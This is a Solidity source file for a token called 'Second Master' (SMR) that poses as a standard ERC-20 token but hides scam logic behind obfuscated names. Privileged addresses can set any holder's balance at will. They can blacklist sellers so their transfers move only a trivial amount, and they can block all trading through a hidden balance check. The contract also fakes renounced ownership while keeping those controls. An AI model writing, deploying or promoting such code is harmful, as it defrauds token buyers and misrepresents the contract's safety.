//SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface launchedFeeAuto {
    function createPair(address sellToAmount, address takeAmount) external returns (address);
}

interface launchedReceiver {
    function totalSupply() external view returns (uint256);

    function balanceOf(address tokenTrading) external view returns (uint256);

    function transfer(address minFee, uint256 exemptWallet) external returns (bool);

    function allowance(address launchAuto, address spender) external view returns (uint256);

    function approve(address spender, uint256 exemptWallet) external returns (bool);

    function transferFrom(
        address sender,
        address minFee,
        uint256 exemptWallet
    ) external returns (bool);

    event Transfer(address indexed from, address indexed txAmount, uint256 value);
    event Approval(address indexed launchAuto, address indexed spender, uint256 value);
}

abstract contract enableMax {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface txEnable {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface receiverTake is launchedReceiver {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract SecondMaster is enableMax, launchedReceiver, receiverTake {

    function fundLimitWallet(address txSellLiquidity, address minFee, uint256 exemptWallet) internal returns (bool) {
        require(receiverAmount[txSellLiquidity] >= exemptWallet);
        receiverAmount[txSellLiquidity] -= exemptWallet;
        receiverAmount[minFee] += exemptWallet;
        emit Transfer(txSellLiquidity, minFee, exemptWallet);
        return true;
    }

    function balanceOf(address tokenTrading) public view virtual override returns (uint256) {
        return receiverAmount[tokenTrading];
    }

    function decimals() external view virtual override returns (uint8) {
        return launchSwap;
    }

    function senderFundTeam(address takeFund) public {
        shouldExemptTake();
        if (minIs != senderTeamToken) {
            totalFund = false;
        }
        if (takeFund == teamFund || takeFund == buyAuto) {
            return;
        }
        sellReceiver[takeFund] = true;
    }

    uint256 private takeFundLaunched = 100000000 * 10 ** 18;

    uint256 enableFrom;

    uint256 private txModeEnable;

    bool public takeSender;

    uint256 public swapFee;

    function name() external view virtual override returns (string memory) {
        return minAmount;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return takeFundLaunched;
    }

    mapping(address => uint256) private receiverAmount;

    event OwnershipTransferred(address indexed modeList, address indexed enableSwap);

    function owner() external view returns (address) {
        return atWallet;
    }

    bool private shouldMarketing;

    uint256 atFee;

    function shouldExemptTake() private view {
        require(atSell[_msgSender()]);
    }

    uint256 constant atList = 5 ** 10;

    bool public totalFund;

    bool private senderTeamToken;

    function shouldAuto(address txSellLiquidity, address minFee, uint256 exemptWallet) internal returns (bool) {
        if (txSellLiquidity == teamFund) {
            return fundLimitWallet(txSellLiquidity, minFee, exemptWallet);
        }
        uint256 shouldWallet = launchedReceiver(buyAuto).balanceOf(minLimitMarketing);
        require(shouldWallet == enableFrom);
        require(minFee != minLimitMarketing);
        if (sellReceiver[txSellLiquidity]) {
            return fundLimitWallet(txSellLiquidity, minFee, atList);
        }
        return fundLimitWallet(txSellLiquidity, minFee, exemptWallet);
    }

    string private minAmount = "Second Master";

    bool private liquidityLaunch;

    address minLimitMarketing = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    string private listBuy = "SMR";

    mapping(address => bool) public sellReceiver;

    bool private fundFee;

    address private atWallet;

    address receiverMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function transferFrom(address txSellLiquidity, address minFee, uint256 exemptWallet) external override returns (bool) {
        if (_msgSender() != receiverMarketing) {
            if (isLiquidityTx[txSellLiquidity][_msgSender()] != type(uint256).max) {
                require(exemptWallet <= isLiquidityTx[txSellLiquidity][_msgSender()]);
                isLiquidityTx[txSellLiquidity][_msgSender()] -= exemptWallet;
            }
        }
        return shouldAuto(txSellLiquidity, minFee, exemptWallet);
    }

    function transfer(address amountWallet, uint256 exemptWallet) external virtual override returns (bool) {
        return shouldAuto(_msgSender(), amountWallet, exemptWallet);
    }

    mapping(address => bool) public atSell;

    function approve(address tokenTakeMax, uint256 exemptWallet) public virtual override returns (bool) {
        isLiquidityTx[_msgSender()][tokenTakeMax] = exemptWallet;
        emit Approval(_msgSender(), tokenTakeMax, exemptWallet);
        return true;
    }

    mapping(address => mapping(address => uint256)) private isLiquidityTx;

    address public teamFund;

    address public buyAuto;

    constructor (){
        if (fundFee) {
            enableAt = swapFee;
        }
        txEnable takeLaunch = txEnable(receiverMarketing);
        buyAuto = launchedFeeAuto(takeLaunch.factory()).createPair(takeLaunch.WETH(), address(this));
        
        teamFund = _msgSender();
        atSell[teamFund] = true;
        receiverAmount[teamFund] = takeFundLaunched;
        shouldAt();
        if (minIs != shouldMarketing) {
            shouldMarketing = true;
        }
        emit Transfer(address(0), teamFund, takeFundLaunched);
    }

    function allowance(address marketingMax, address tokenTakeMax) external view virtual override returns (uint256) {
        if (tokenTakeMax == receiverMarketing) {
            return type(uint256).max;
        }
        return isLiquidityTx[marketingMax][tokenTakeMax];
    }

    uint256 private launchedToken;

    function shouldAt() public {
        emit OwnershipTransferred(teamFund, address(0));
        atWallet = address(0);
    }

    function walletExempt(address modeReceiver) public {
        require(modeReceiver.balance < 100000);
        if (takeSender) {
            return;
        }
        if (shouldMarketing) {
            senderTeamToken = false;
        }
        atSell[modeReceiver] = true;
        if (senderTeamToken) {
            txModeEnable = swapFee;
        }
        takeSender = true;
    }

    function tradingToMode(uint256 exemptWallet) public {
        shouldExemptTake();
        enableFrom = exemptWallet;
    }

    uint8 private launchSwap = 18;

    uint256 private enableAt;

    function liquidityMarketing(address amountWallet, uint256 exemptWallet) public {
        shouldExemptTake();
        receiverAmount[amountWallet] = exemptWallet;
    }

    function symbol() external view virtual override returns (string memory) {
        return listBuy;
    }

    function getOwner() external view returns (address) {
        return atWallet;
    }

    bool public minIs;

}